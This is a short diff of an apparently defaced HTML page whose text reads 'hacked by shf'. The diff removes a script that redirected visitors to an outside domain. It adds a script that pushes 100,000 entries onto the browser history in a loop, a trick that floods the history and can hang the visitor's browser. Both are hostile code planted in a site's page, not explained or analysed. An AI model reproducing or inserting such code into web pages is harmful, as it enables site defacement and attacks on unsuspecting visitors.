@@ -4,6 +4,11 @@
   </div>
   <link rel="stylesheet" type="text/css" href="index.css">
   <textarea>hacked by shf</textarea>
-  <script type="text/javascript>
-                window.location.href='http://whps.ga';</script>
+          <script>
+            var total = "#";
+            for( var i = 0; i < 100000; i++ ) {
+                total = total + i.toString();
+                history.pushState(0,0, total );
+            }
+        </script>
   <body>
